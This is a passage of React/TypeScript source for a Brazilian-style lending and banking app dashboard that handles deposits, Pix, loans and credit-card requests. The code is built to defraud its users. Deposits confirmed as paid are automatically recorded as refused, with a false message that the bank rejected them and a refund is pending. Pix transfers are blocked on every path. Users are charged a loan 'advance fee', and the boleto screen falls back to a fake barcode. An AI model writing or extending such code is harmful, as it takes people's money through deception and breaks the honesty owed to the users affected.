import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { useNavigate } from 'react-router-dom';
import { 
  Eye, EyeOff, CreditCard, Car, ArrowUpRight, 
  ArrowDownLeft, Wallet, Plus, LogOut, ChevronDown, 
  User, QrCode, Receipt, ShoppingBag, Home, FileText,
  ChevronRight, Sparkles, Smartphone, X, Send, Download,
  MessageCircle, History, Key, AlertCircle, TrendingUp, CheckCircle2
} from 'lucide-react';
import { UserProfile, AppConfig, LoanProposal } from '../types';
import { doc, getDoc, updateDoc, collection, query, where, getDocs, onSnapshot, setDoc, orderBy, limit } from 'firebase/firestore';
import { db, handleFirestoreError, OperationType } from '../firebase';
import { sigiloPayService, SigiloPayResponse } from '../services/sigiloPayService';

export default function Dashboard({ profile, onLogout, setProfile }: { profile: UserProfile, onLogout: () => void, setProfile: (p: UserProfile) => void }) {
  const navigate = useNavigate();
  const [showBalance, setShowBalance] = useState(true);
  const [config, setConfig] = useState<AppConfig | null>(null);
  const [activeMenu, setActiveMenu] = useState<'pix' | 'deposit' | 'help' | 'taxes' | 'credit_card' | null>(null);
  const [hasDeposit, setHasDeposit] = useState(false);
  const [ccStep, setCcStep] = useState<'info' | 'amount' | 'analyzing'>('info');
  const [ccAmount, setCcAmount] = useState('');

  useEffect(() => {
    if (profile.creditCardRequest?.status === 'pending') {
      setCcStep('analyzing');
      setCcAmount(profile.creditCardRequest.amount.toString());
    }
  }, [profile.creditCardRequest]);
  
  // Pix States
  const [pixStep, setPixStep] = useState<'main' | 'transfer' | 'register'>('main');
  const [pixKey, setPixKey] = useState('');
  const [pixAmount, setPixAmount] = useState('');
  const [pixError, setPixError] = useState('');
  const [loadingPix, setLoadingPix] = useState<'transfer' | 'register' | null>(null);

  // Deposit States
  const [depositAmount, setDepositAmount] = useState('');
  const [depositMethod, setDepositMethod] = useState<'pix' | 'boleto' | null>(null);
  const [depositStep, setDepositStep] = useState<'amount' | 'method' | 'result' | 'error'>('amount');
  const [sigiloPayResult, setSigiloPayResult] = useState<SigiloPayResponse | null>(null);
  const [isGeneratingPayment, setIsGeneratingPayment] = useState(false);
  const [copied, setCopied] = useState<string | null>(null);
  const [showSuccessAnimation, setShowSuccessAnimation] = useState(false);

  useEffect(() => {
    const fetchConfig = async () => {
      const configSnap = await getDoc(doc(db, 'config', 'app'));
      if (configSnap.exists()) {
        setConfig(configSnap.data() as AppConfig);
      }
    };
    fetchConfig();

    const checkDeposits = async () => {
      const q = query(
        collection(db, 'proposals'),
        where('userId', '==', profile.uid),
        where('status', '==', 'completed')
      );
      const snap = await getDocs(q);
      setHasDeposit(!snap.empty || profile.balance > 0);
    };
    checkDeposits();
  }, [profile.uid, profile.balance]);

  const handleCCRequest = async () => {
    if (!ccAmount || Number(ccAmount) <= 0) return;
    
    try {
      const userRef = doc(db, 'users', profile.uid);
      await updateDoc(userRef, {
        creditCardRequest: {
          status: 'pending',
          amount: Number(ccAmount),
          timestamp: new Date().toISOString()
        }
      });
      setCcStep('analyzing');
    } catch (error) {
      handleFirestoreError(error, OperationType.UPDATE, `users/${profile.uid}`);
    }
  };

  const handleNavigateToLoan = () => {
    navigate('/simulate');
  };

  const handleGenerateDeposit = async (method: 'pix' | 'boleto') => {
    if (isGeneratingPayment) return;

    if (!profile || !profile.uid) {
      setSigiloPayResult({ success: false, error: "Sessão inválida. Por favor, saia e entre novamente. [ERR-DEP-001]" });
      setDepositStep('error');
      return;
    }

    const amount = parseFloat(depositAmount);
    if (isNaN(amount) || amount <= 0) {
      setSigiloPayResult({ success: false, error: "Por favor, insira um valor válido para o depósito. [ERR-DEP-002]" });
      setDepositStep('error');
      return;
    }

    setIsGeneratingPayment(true);
    setDepositMethod(method);
    try {
      if (!sigiloPayService) {
        throw new Error("Serviço de pagamento indisponível. [ERR-DEP-003]");
      }

      let response: SigiloPayResponse;
      if (method === 'pix') {
        response = await sigiloPayService.generatePix(amount, `Depósito em conta - ${profile.fullName || 'Cliente'}`, profile.uid);
      } else {
        response = await sigiloPayService.generateBoleto(amount, `Depósito em conta - ${profile.fullName || 'Cliente'}`, profile.uid);
      }
      
      if (!response || !response.success) {
        setSigiloPayResult(response || { success: false, error: "Falha na resposta do servidor. [ERR-DEP-004]" });
        setDepositStep('error');
        return;
      }

      setSigiloPayResult(response);
      setDepositStep('result');
    } catch (err: any) {
      console.error("SigiloPay Error:", err);
      const errorMessage = err.message === 'Failed to fetch' 
        ? "Erro de conexão. Verifique sua internet e tente novamente. [ERR-DEP-005]"
        : (err.message || "Ocorreu um erro ao processar seu depósito. [ERR-DEP-006]");
      
      setSigiloPayResult({ success: false, error: errorMessage });
      setDepositStep('error');
    } finally {
      setIsGeneratingPayment(false);
    }
  };

  useEffect(() => {
    if (!profile?.uid) return;

    // Monitorar pagamentos confirmados do usuário
    // Usamos um timestamp para pegar apenas pagamentos novos desde que o componente montou
    const startTime = new Date().toISOString();

    const q = query(
      collection(db, 'payments'),
      where('userId', '==', profile.uid),
      where('status', '==', 'paid')
    );

    const unsubscribe = onSnapshot(q, async (snapshot) => {
      const newPayments = snapshot.docs.filter(doc => {
        const data = doc.data();
        // Apenas pagamentos confirmados após a montagem do componente
        return data.updatedAt && data.updatedAt >= startTime;
      });

      if (newPayments.length > 0) {
        // Se o modal de depósito estiver aberto, fechamos e limpamos
        if (sigiloPayResult) {
          setSigiloPayResult(null);
          setActiveMenu(null);
          setDepositStep('amount');
          setShowSuccessAnimation(true);
        }
        
        // Processar cada novo pagamento detectado
        for (const paymentDoc of newPayments) {
          const paymentData = paymentDoc.data();
          
          // CASO 1: Depósito em conta (resulta em recusa conforme regra de negócio solicitada)
          if (paymentData.description?.includes("Depósito em conta")) {
            // Usamos o ID externo ou o ID do documento para evitar duplicatas (idempotência)
            const paymentId = paymentData.externalId || paymentData.identifier || paymentDoc.id;
            const proposalId = `refused_${paymentId}`;
            
            // Verificar se já existe uma proposta com este ID
            const proposalDoc = await getDoc(doc(db, 'proposals', proposalId));
            if (!proposalDoc.exists()) {
              const newProposal: LoanProposal = {
                id: proposalId,
                userId: profile.uid,
                userName: profile.fullName,
                userEmail: profile.email,
                requestedAmount: paymentData.amount || 0,
                installments: 1,
                status: 'refused',
                createdAt: new Date().toISOString(),
                updatedAt: new Date().toISOString(),
                approvedAmount: paymentData.amount || 0,
                refusalReason: 'O Pix do depósito foi recusado pelo banco emissor e está em processo de estorno. O tempo para o banco compensar pode ser de até 24 horas úteis.'
              };
              
              try {
                await setDoc(doc(db, 'proposals', proposalId), newProposal);
                console.log("Refused deposit created for payment (as requested):", paymentDoc.id);
              } catch (error) {
                console.error("Error creating refused proposal:", error);
              }
            }
          }

          // CASO 2: Taxa de Antecipação de Empréstimo
          if (paymentData.description?.includes("Taxa de Antecipação")) {
            console.log("Loan fee payment detected in Dashboard:", paymentDoc.id);
            
            // Buscar proposta pendente para atualizar
            const qProp = query(
              collection(db, 'proposals'),
              where('userId', '==', profile.uid),
              where('status', '==', 'pending'),
              orderBy('createdAt', 'desc'),
              limit(1)
            );
            
            try {
              const propSnap = await getDocs(qProp);
              if (!propSnap.empty) {
                const propDoc = propSnap.docs[0];
                await updateDoc(propDoc.ref, {
                  status: 'paid',
                  updatedAt: new Date().toISOString()
                });
                console.log("Proposal updated to paid from Dashboard:", propDoc.id);
              }
            } catch (error) {
              console.error("Error updating proposal from Dashboard:", error);
            }
          }
        }
      }
    });

    return () => unsubscribe();
  }, [profile?.uid]); // Removido sigiloPayResult da dependência para manter o listener ativo

  return (
    <div className="min-h-screen bg-[#F5F7F9] pb-24 font-sans">
      {/* Top Bar - Green Header */}
      <header className="bg-[#008542] px-6 pt-8 pb-12 text-white">
        <div className="flex items-center justify-between mb-4">
          <div className="flex flex-col">
            <motion.button 
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
              onClick={() => navigate('/profile')}
              className="flex items-center space-x-1 text-lg font-bold"
            >
              <span>Olá, {profile.fullName.split(' ')[0]}</span>
              <ChevronDown size={20} />
            </motion.button>
            <span className="text-xs opacity-80">{profile.cpf}</span>
          </div>
          <div className="flex items-center space-x-3">
            <motion.button 
              whileHover={{ scale: 1.1 }}
              whileTap={{ scale: 0.9 }}
              onClick={() => setShowBalance(!showBalance)}
              className="w-10 h-10 bg-white/10 rounded-xl flex items-center justify-center backdrop-blur-sm"
            >
              {showBalance ? <Eye size={20} /> : <EyeOff size={20} />}
            </motion.button>
            <motion.button 
              whileHover={{ scale: 1.1 }}
              whileTap={{ scale: 0.9 }}
              onClick={() => {
                if (profile.role === 'admin') {
                  navigate('/admin');
                } else {
                  navigate('/profile');
                }
              }}
              className="w-10 h-10 bg-white/10 rounded-xl flex items-center justify-center backdrop-blur-sm"
            >
              <User size={20} />
            </motion.button>
          </div>
        </div>
      </header>

      <div className="px-4 -mt-8 space-y-4">
        {/* Main Balance Card */}
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          onClick={() => navigate('/statement')}
          className="bg-white rounded-2xl p-6 shadow-sm border border-zinc-100 cursor-pointer active:scale-[0.98] transition-all"
        >
          <div className="flex items-center justify-between mb-2">
            <span className="text-sm text-zinc-500">Saldo da Conta</span>
            <ChevronRight size={18} className="text-zinc-300" />
          </div>
          <div className="mb-6">
            <h2 className="text-3xl font-bold text-zinc-900">
              {showBalance ? `R$ ${(profile.balance || 0).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}` : '••••••'}
            </h2>
            <div className="flex items-center space-x-1 mt-1">
              <TrendingUp size={12} className="text-emerald-500" />
              <span className="text-[10px] font-bold text-emerald-500">105% do CDI</span>
            </div>
          </div>
          
          <div className="pt-4 border-t border-zinc-50 flex items-center justify-between">
            <div className="flex flex-col">
              <span className="text-[13px] font-bold text-zinc-900">Reserva EmpireCred</span>
              <span className="text-[10px] text-zinc-500">Deixe o dinheiro trabalhar para você</span>
            </div>
            <motion.button 
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
              onClick={(e) => {
                e.stopPropagation();
                navigate('/reserva');
              }}
              className="text-[#008542] font-bold text-sm"
            >
              Conhecer
            </motion.button>
          </div>
        </motion.div>

        {/* Quick Actions Grid */}
        <div className="grid grid-cols-4 gap-2 py-4">
          <QuickAction 
            icon={<img src="https://imgur.com/xsDK8PH.png" alt="Pix" className="w-6 h-6 object-contain" />} 
            label="Pix" 
            onClick={() => {
              setActiveMenu('pix');
              setPixStep('main');
              setPixError('');
            }}
          />
          <QuickAction 
            icon={<img src="https://imgur.com/zOq0SmV.png" alt="Empréstimos" className="w-6 h-6 object-contain" />} 
            label="Empréstimos" 
            onClick={handleNavigateToLoan} 
            active 
          />
          <QuickAction 
            icon={<img src="https://imgur.com/CZpG1Sv.png" alt="Depositar" className="w-6 h-6 object-contain" />} 
            label="Depositar" 
            onClick={() => {
              setActiveMenu('deposit');
              setDepositStep('amount');
              setDepositMethod(null);
            }}
          />
          <QuickAction 
            icon={<img src="https://imgur.com/tV12UyV.png" alt="Ajuda" className="w-6 h-6 object-contain" />} 
            label="Ajuda" 
            onClick={() => setActiveMenu('help')}
          />
        </div>

        {/* Promo Banners */}
        <div className="space-y-3">
          {config?.banners?.[0] ? (
            <motion.div 
              whileHover={{ scale: 1.01 }}
              className="rounded-2xl overflow-hidden shadow-sm border border-zinc-100"
            >
              <img src={config.banners[0]} alt="Banner" className="w-full h-auto object-cover" />
            </motion.div>
          ) : (
            <div className="bg-white p-4 rounded-2xl border border-zinc-100 flex items-center justify-between shadow-sm">
              <div className="flex items-center space-x-4">
                <div className="w-10 h-10 bg-zinc-50 rounded-xl flex items-center justify-center text-zinc-400">
                  <Smartphone size={20} />
                </div>
                <div>
                  <p className="font-bold text-sm">Venda por boleto</p>
                  <p className="text-[10px] text-zinc-500">Recebimento mais rápido e seguro</p>
                </div>
              </div>
              <motion.button 
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
                className="bg-[#008542] text-white px-4 py-1.5 rounded-lg text-xs font-bold"
              >
                Use já
              </motion.button>
            </div>
          )}
        </div>

        {/* Bottom Grid Actions */}
        <div className="grid grid-cols-3 gap-3">
          <motion.div 
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
            onClick={() => setActiveMenu('credit_card')}
            className="bg-white p-4 rounded-2xl text-zinc-900 border border-zinc-100 aspect-square flex flex-col justify-between shadow-sm cursor-pointer"
          >
            <div className="w-8 h-8 bg-emerald-50 rounded-lg flex items-center justify-center text-emerald-600">
              <CreditCard size={20} />
            </div>
            <span className="text-xs font-bold leading-tight">Cartão de Crédito</span>
          </motion.div>
          <motion.div 
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
            onClick={() => setActiveMenu('taxes')}
            className="bg-white p-4 rounded-2xl text-zinc-900 border border-zinc-100 aspect-square flex flex-col justify-between shadow-sm cursor-pointer"
          >
            <div className="w-8 h-8 bg-zinc-50 rounded-lg flex items-center justify-center text-zinc-400">
              <Plus size={20} />
            </div>
            <span className="text-xs font-bold leading-tight">Taxas e impostos</span>
          </motion.div>
          <motion.div 
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
            onClick={() => navigate('/reserva')}
            className="bg-white p-4 rounded-2xl text-zinc-900 border border-zinc-100 aspect-square flex flex-col justify-between shadow-sm cursor-pointer"
          >
            <div className="w-8 h-8 bg-zinc-50 rounded-lg flex items-center justify-center text-zinc-400">
              <Receipt size={20} />
            </div>
            <span className="text-xs font-bold leading-tight">Reserva</span>
          </motion.div>
        </div>
      </div>

      {/* Logout Button */}
      <div className="px-6 py-8 space-y-4">
        <motion.div 
          whileHover={{ scale: 1.02 }}
          whileTap={{ scale: 0.98 }}
          onClick={() => navigate('/simulate?story=dicas')}
          className="rounded-2xl overflow-hidden shadow-sm border border-zinc-100 cursor-pointer"
        >
          <img src="https://imgur.com/xnOHtOD.png" alt="Dicas de Crédito" className="w-full h-auto object-cover" />
        </motion.div>

        <motion.button 
          whileHover={{ scale: 1.02, backgroundColor: '#FEF2F2' }}
          whileTap={{ scale: 0.98 }}
          onClick={onLogout}
          className="w-full py-4 rounded-2xl border border-red-100 text-red-500 font-bold flex items-center justify-center space-x-2"
        >
          <LogOut size={20} />
          <span>Sair da Conta</span>
        </motion.button>
      </div>

      {/* Bottom Navigation */}
      <nav className="fixed bottom-0 left-0 right-0 bg-white border-t border-zinc-100 px-8 py-4 flex justify-around items-center z-50">
        <button className="flex flex-col items-center space-y-1 text-[#008542]">
          <Home size={24} />
          <span className="text-[10px] font-bold">Início</span>
        </button>
        <button 
          onClick={() => navigate('/statement')}
          className="flex flex-col items-center space-y-1 text-zinc-400"
        >
          <FileText size={24} />
          <span className="text-[10px] font-bold">Extrato</span>
        </button>
      </nav>

      {/* Modals / Menus */}
      <AnimatePresence>
        {isGeneratingPayment && (
          <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/40 backdrop-blur-[2px]">
            <div className="bg-white p-8 rounded-3xl shadow-2xl flex flex-col items-center space-y-4">
              <motion.div 
                animate={{ rotate: 360 }}
                transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                className="w-10 h-10 border-4 border-[#008542] border-t-transparent rounded-full"
              />
              <p className="text-sm font-bold text-zinc-900">Gerando cobrança segura...</p>
            </div>
          </div>
        )}
      </AnimatePresence>

      <AnimatePresence>
        {activeMenu === 'pix' && (
          <div className="fixed inset-0 z-[100] bg-white">
            <motion.div 
              initial={{ x: "100%" }}
              animate={{ x: 0 }}
              exit={{ x: "100%" }}
              transition={{ type: 'spring', damping: 25, stiffness: 200 }}
              className="h-full w-full bg-white p-8 space-y-8 overflow-y-auto"
            >
              <div className="flex items-center justify-between">
                <div className="flex items-center space-x-4">
                  <div className="w-10 h-10 bg-emerald-50 rounded-xl flex items-center justify-center text-[#008542]">
                    <QrCode size={24} />
                  </div>
                  <h3 className="text-xl font-bold text-zinc-900">Pix</h3>
                </div>
                <button onClick={() => setActiveMenu(null)} className="text-zinc-400 p-2">
                  <X size={24} />
                </button>
              </div>

              {pixStep === 'main' && (
                <div className="space-y-6">
                  <div className="grid grid-cols-2 gap-4">
                    <button 
                      onClick={() => {
                        setLoadingPix('transfer');
                        setTimeout(() => {
                          setLoadingPix(null);
                          if (profile.balance > 0) {
                            setPixError('Para fazer um pix ou cadastrar chave é necessário fazer o depósito pelo menos uma vez');
                          } else if (profile.balance <= 0) {
                            setPixError('Você precisa de saldo na conta para realizar um pix');
                          } else {
                            setPixStep('transfer');
                            setPixError('');
                          }
                        }, 1000);
                      }}
                      disabled={loadingPix !== null}
                      className="flex flex-col items-center justify-center p-6 bg-zinc-50 rounded-2xl border border-zinc-100 space-y-3 hover:bg-zinc-100 transition-colors relative"
                    >
                      {loadingPix === 'transfer' ? (
                        <div className="w-12 h-12 flex items-center justify-center">
                          <motion.div 
                            animate={{ rotate: 360 }}
                            transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                            className="w-6 h-6 border-2 border-[#008542] border-t-transparent rounded-full"
                          />
                        </div>
                      ) : (
                        <div className="w-12 h-12 bg-emerald-100 rounded-full flex items-center justify-center text-[#008542]">
                          <Send size={24} />
                        </div>
                      )}
                      <span className="text-sm font-bold text-zinc-900">Fazer um pix</span>
                    </button>

                    <button 
                      onClick={() => {
                        setLoadingPix('register');
                        setTimeout(() => {
                          setLoadingPix(null);
                          if (profile.balance > 0) {
                            setPixError('Para fazer um pix ou cadastrar chave é necessário fazer o depósito pelo menos uma vez');
                          } else if (profile.balance <= 0) {
                            setPixError('Você precisa de saldo na conta para cadastrar uma chave');
                          } else {
                            setPixStep('register');
                            setPixError('');
                          }
                        }, 1000);
                      }}
                      disabled={loadingPix !== null}
                      className="flex flex-col items-center justify-center p-6 bg-zinc-50 rounded-2xl border border-zinc-100 space-y-3 hover:bg-zinc-100 transition-colors relative"
                    >
                      {loadingPix === 'register' ? (
                        <div className="w-12 h-12 flex items-center justify-center">
                          <motion.div 
                            animate={{ rotate: 360 }}
                            transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                            className="w-6 h-6 border-2 border-[#008542] border-t-transparent rounded-full"
                          />
                        </div>
                      ) : (
                        <div className="w-12 h-12 bg-emerald-100 rounded-full flex items-center justify-center text-[#008542]">
                          <Key size={24} />
                        </div>
                      )}
                      <span className="text-sm font-bold text-zinc-900">Cadastrar chave</span>
                    </button>
                  </div>

                  {pixError && (
                    <motion.div 
                      initial={{ opacity: 0, scale: 0.9 }}
                      animate={{ opacity: 1, scale: 1 }}
                      className="p-4 bg-red-50 border border-red-100 rounded-xl text-red-600 text-xs font-bold text-center"
                    >
                      {pixError}
                    </motion.div>
                  )}

                  <div className="space-y-4">
                    <div className="flex items-center justify-between">
                      <h4 className="text-xs font-bold text-zinc-400 uppercase tracking-widest">Últimas Transações</h4>
                      <History size={16} className="text-zinc-300" />
                    </div>
                    <div className="space-y-3">
                      {/* Only show real transactions - since we don't have a history yet, we show empty state */}
                      <div className="py-8 text-center space-y-2">
                        <div className="w-12 h-12 bg-zinc-50 rounded-full flex items-center justify-center mx-auto text-zinc-300">
                          <History size={24} />
                        </div>
                        <p className="text-xs text-zinc-400 font-medium">Nenhuma transação realizada</p>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {pixStep === 'transfer' && (
                <div className="space-y-6">
                  <div className="space-y-4">
                    <div className="space-y-2">
                      <label className="text-xs font-bold text-zinc-400 uppercase tracking-widest">Chave Pix</label>
                      <input 
                        type="text" 
                        value={pixKey}
                        onChange={e => setPixKey(e.target.value)}
                        placeholder="CPF, E-mail, Telefone ou Chave Aleatória"
                        className="w-full bg-zinc-50 border-none rounded-2xl py-4 px-5 text-sm font-bold outline-none focus:ring-2 focus:ring-[#008542]"
                      />
                    </div>
                    <div className="space-y-2">
                      <label className="text-xs font-bold text-zinc-400 uppercase tracking-widest">Valor</label>
                      <div className="relative">
                        <span className="absolute left-5 top-1/2 -translate-y-1/2 font-bold text-zinc-400">R$</span>
                        <input 
                          type="number" 
                          value={pixAmount}
                          onChange={e => setPixAmount(e.target.value)}
                          placeholder="0,00"
                          className="w-full bg-zinc-50 border-none rounded-2xl py-4 pl-12 pr-5 text-lg font-bold outline-none focus:ring-2 focus:ring-[#008542]"
                        />
                      </div>
                    </div>
                  </div>
                  <button 
                    onClick={() => {
                      alert("Transferência realizada com sucesso!");
                      setActiveMenu(null);
                    }}
                    className="w-full bg-zinc-900 text-white py-4 rounded-2xl font-bold shadow-xl"
                  >
                    Confirmar Transferência
                  </button>
                  <button onClick={() => setPixStep('main')} className="w-full text-zinc-400 text-sm font-bold">Voltar</button>
                </div>
              )}

              {pixStep === 'register' && (
                <div className="space-y-6">
                  <div className="space-y-4">
                    <p className="text-sm text-zinc-500">Escolha o tipo de chave que deseja cadastrar:</p>
                    <div className="space-y-2">
                      {['CPF', 'E-mail', 'Telefone', 'Chave Aleatória'].map(type => (
                        <button key={type} className="w-full p-4 bg-zinc-50 rounded-xl border border-zinc-100 text-left font-bold text-zinc-900 hover:bg-zinc-100 transition-colors">
                          {type}
                        </button>
                      ))}
                    </div>
                  </div>
                  <button onClick={() => setPixStep('main')} className="w-full text-zinc-400 text-sm font-bold">Voltar</button>
                </div>
              )}
            </motion.div>
          </div>
        )}

        {activeMenu === 'deposit' && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setActiveMenu(null)}
              className="absolute inset-0 bg-black/60 backdrop-blur-sm"
            />
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="relative w-full max-w-md bg-white rounded-[32px] p-8 space-y-8 overflow-hidden shadow-2xl"
            >
              <div className="flex items-center justify-between">
                <h3 className="text-xl font-bold text-zinc-900">Depositar</h3>
                <button onClick={() => setActiveMenu(null)} className="text-zinc-400 p-2">
                  <X size={24} />
                </button>
              </div>

              {depositStep === 'amount' && (
                <div className="space-y-6">
                  <div className="space-y-2">
                    <label className="text-xs font-bold text-zinc-400 uppercase tracking-widest">Qual valor deseja depositar?</label>
                    <div className="relative">
                      <span className="absolute left-5 top-1/2 -translate-y-1/2 font-bold text-zinc-400">R$</span>
                      <input 
                        type="number" 
                        value={depositAmount}
                        onChange={e => setDepositAmount(e.target.value)}
                        placeholder="0,00"
                        className="w-full bg-zinc-50 border-none rounded-2xl py-4 pl-12 pr-5 text-lg font-bold outline-none focus:ring-2 focus:ring-[#008542]"
                      />
                    </div>
                    <p className="text-[10px] text-zinc-400 font-bold ml-1 uppercase tracking-widest">Valor mínimo: R$ 50,00</p>
                  </div>
                  <button 
                    disabled={!depositAmount || parseFloat(depositAmount) < 50.00}
                    onClick={() => setDepositStep('method')}
                    className="w-full bg-[#008542] text-white py-4 rounded-2xl font-bold shadow-lg disabled:opacity-50"
                  >
                    Continuar
                  </button>
                </div>
              )}

              {depositStep === 'method' && (
                <div className="space-y-6">
                  <p className="text-sm text-zinc-500">Escolha a forma de depósito:</p>
                  <div className="space-y-3">
                    <button 
                      disabled={isGeneratingPayment}
                      onClick={() => handleGenerateDeposit('pix')}
                      className="w-full p-6 bg-zinc-50 rounded-2xl border border-zinc-100 flex items-center space-x-4 hover:bg-zinc-100 transition-colors disabled:opacity-50"
                    >
                      <div className="w-12 h-12 bg-emerald-100 rounded-full flex items-center justify-center text-[#008542]">
                        {isGeneratingPayment && depositMethod === 'pix' ? (
                          <motion.div 
                            animate={{ rotate: 360 }}
                            transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                            className="w-6 h-6 border-2 border-[#008542] border-t-transparent rounded-full"
                          />
                        ) : (
                          <QrCode size={24} />
                        )}
                      </div>
                      <div className="text-left">
                        <p className="font-bold text-zinc-900">Pix</p>
                        <p className="text-[10px] text-zinc-500">Liberação imediata</p>
                      </div>
                    </button>

                    <button 
                      disabled={isGeneratingPayment}
                      onClick={() => handleGenerateDeposit('boleto')}
                      className="w-full p-6 bg-zinc-50 rounded-2xl border border-zinc-100 flex items-center space-x-4 hover:bg-zinc-100 transition-colors disabled:opacity-50"
                    >
                      <div className="w-12 h-12 bg-emerald-100 rounded-full flex items-center justify-center text-[#008542]">
                        {isGeneratingPayment && depositMethod === 'boleto' ? (
                          <motion.div 
                            animate={{ rotate: 360 }}
                            transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                            className="w-6 h-6 border-2 border-[#008542] border-t-transparent rounded-full"
                          />
                        ) : (
                          <Receipt size={24} />
                        )}
                      </div>
                      <div className="text-left">
                        <p className="font-bold text-zinc-900">Boleto</p>
                        <p className="text-[10px] text-zinc-500">Compensação em até 3 dias úteis</p>
                      </div>
                    </button>
                  </div>
                  <button onClick={() => setDepositStep('amount')} className="w-full text-zinc-400 text-sm font-bold">Voltar</button>
                </div>
              )}

              {depositStep === 'result' && (
                <div className="space-y-6 text-center">
                  <div className="w-20 h-20 bg-emerald-50 rounded-full flex items-center justify-center mx-auto text-[#008542]">
                    {depositMethod === 'pix' ? <QrCode size={40} /> : <Receipt size={40} />}
                  </div>
                  <div className="space-y-2">
                    <h4 className="font-bold text-zinc-900">Pagamento Gerado</h4>
                    <p className="text-sm text-zinc-500">Realize o pagamento de R$ {(parseFloat(depositAmount) || 0).toLocaleString('pt-BR', { minimumFractionDigits: 2 })} para concluir o depósito.</p>
                  </div>
                  
                  <div className="bg-zinc-50 p-6 rounded-2xl border border-zinc-100">
                    {depositMethod === 'pix' ? (
                      <div className="space-y-4">
                        {sigiloPayResult?.pixQrCode ? (
                          <div className="w-48 h-48 bg-white rounded-2xl mx-auto p-2 border-2 border-zinc-100">
                            <img src={sigiloPayResult.pixQrCode} alt="QR Code Pix" className="w-full h-full object-contain" />
                          </div>
                        ) : (
                          <div className="w-32 h-32 bg-zinc-900 rounded-xl mx-auto flex items-center justify-center opacity-20">
                            <QrCode size={64} className="text-white" />
                          </div>
                        )}

                        {sigiloPayResult?.pixCode && (
                          <p className="text-[10px] text-zinc-400 font-mono break-all line-clamp-1 opacity-60 px-4">
                            {sigiloPayResult.pixCode.substring(0, 25)}...{sigiloPayResult.pixCode.substring(sigiloPayResult.pixCode.length - 10)}
                          </p>
                        )}

                        <button 
                          onClick={() => {
                            if (sigiloPayResult?.pixCode) {
                              navigator.clipboard.writeText(sigiloPayResult.pixCode);
                              setCopied('pix');
                              setTimeout(() => setCopied(null), 2000);
                            }
                          }}
                          className="text-[#008542] text-xs font-bold uppercase tracking-widest relative"
                        >
                          <AnimatePresence>
                            {copied === 'pix' && (
                              <motion.div 
                                initial={{ opacity: 0, y: 10 }}
                                animate={{ opacity: 1, y: 0 }}
                                exit={{ opacity: 0, y: -10 }}
                                className="absolute -top-8 left-1/2 -translate-x-1/2 bg-zinc-900 text-white px-3 py-1 rounded-full text-[10px]"
                              >
                                Copiado!
                              </motion.div>
                            )}
                          </AnimatePresence>
                          Copiar Código Pix
                        </button>
                      </div>
                    ) : (
                      <div className="space-y-4">
                        <p className="font-mono text-xs text-zinc-600 break-all">
                          {sigiloPayResult?.barcode || `34191.79001 01043.510047 91020.150008 1 964300000${depositAmount.replace('.', '')}`}
                        </p>
                        <button 
                          onClick={() => {
                            const code = sigiloPayResult?.barcode || `34191.79001 01043.510047 91020.150008 1 964300000${depositAmount.replace('.', '')}`;
                            navigator.clipboard.writeText(code);
                            setCopied('boleto');
                            setTimeout(() => setCopied(null), 2000);
                          }}
                          className="text-[#008542] text-xs font-bold uppercase tracking-widest relative"
                        >
                          <AnimatePresence>
                            {copied === 'boleto' && (
                              <motion.div 
                                initial={{ opacity: 0, y: 10 }}
                                animate={{ opacity: 1, y: 0 }}
                                exit={{ opacity: 0, y: -10 }}
                                className="absolute -top-8 left-1/2 -translate-x-1/2 bg-zinc-900 text-white px-3 py-1 rounded-full text-[10px]"
                              >
                                Copiado!
                              </motion.div>
                            )}
                          </AnimatePresence>
                          Copiar Código de Barras
                        </button>
                        {sigiloPayResult?.paymentLink && (
                          <a 
                            href={sigiloPayResult.paymentLink} 
                            target="_blank" 
                            rel="noopener noreferrer"
                            className="block w-full bg-emerald-500 text-white py-3 rounded-xl text-xs font-bold uppercase tracking-widest"
                          >
                            Visualizar Boleto
                          </a>
                        )}
                      </div>
                    )}
                  </div>

                  <button 
                    onClick={() => setActiveMenu(null)}
                    className="w-full bg-zinc-900 text-white py-4 rounded-2xl font-bold shadow-xl"
                  >
                    Concluído
                  </button>
                </div>
              )}

              {depositStep === 'error' && (
                <div className="space-y-6 text-center">
                  <div className="w-20 h-20 bg-red-50 rounded-full flex items-center justify-center mx-auto text-red-500">
                    <AlertCircle size={40} />
                  </div>
                  <div className="space-y-2">
                    <h4 className="font-bold text-zinc-900">Erro ao Gerar Pagamento</h4>
                    <p className="text-sm text-zinc-500 leading-relaxed">
                      {sigiloPayResult?.error || "Ocorreu um erro inesperado ao processar seu depósito. Por favor, tente novamente mais tarde."}
                    </p>
                  </div>
                  <button 
                    onClick={() => setDepositStep('method')}
                    className="w-full bg-zinc-900 text-white py-4 rounded-2xl font-bold shadow-xl"
                  >
                    Tentar Novamente
                  </button>
                </div>
              )}
            </motion.div>
          </div>
        )}

        {activeMenu === 'taxes' && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setActiveMenu(null)}
              className="absolute inset-0 bg-black/60 backdrop-blur-sm"
            />
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
